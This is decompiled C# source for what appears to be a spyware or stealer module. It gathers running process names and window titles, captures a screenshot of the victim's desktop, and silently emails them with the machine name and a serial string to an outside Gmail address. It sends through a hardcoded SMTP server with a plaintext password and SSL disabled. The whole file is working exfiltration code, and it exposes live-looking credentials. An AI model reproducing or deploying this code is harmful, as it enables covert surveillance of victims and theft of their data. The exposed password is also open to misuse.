using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace FL;

[StandardModule]
public sealed class Mail
{
	public static string GetAllProcess()
	{
		string text = "";
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			text = text + process.ProcessName + ".exe | " + process.MainWindowTitle + "\r\n";
		}
		return text;
	}

	public static string DektopPreview()
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		try
		{
			Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
			Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)925707);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
			((Image)val).Save(Path.GetTempPath() + "\\Screen.jpg", ImageFormat.get_Jpeg());
			return Path.GetTempPath() + "\\Screen.jpg";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static object send(string string_0)
	{
		MailMessage mailMessage = new MailMessage();
		SmtpClient smtpClient = new SmtpClient("auth.smtp.1and1.fr");
		try
		{
			mailMessage.From = new MailAddress("capc@sagform.fr", Environment.MachineName);
			mailMessage.Subject = "V3.1 New Client " + generale.smethod_0();
			mailMessage.Body = "------Process List------\r\n" + GetAllProcess() + "------------------------\r\nSerial Number: " + string_0;
			if (Operators.CompareString(DektopPreview(), "error", false) != 0)
			{
				Attachment item = new Attachment(DektopPreview());
				mailMessage.Attachments.Add(item);
			}
			mailMessage.To.Add("job45124@gmail.com");
			smtpClient.Port = Conversions.ToInteger("587");
			smtpClient.EnableSsl = false;
			smtpClient.Credentials = new NetworkCredential("capc@sagform.fr", "Aptw21@p21");
			smtpClient.Send(mailMessage);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.EndApp();
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
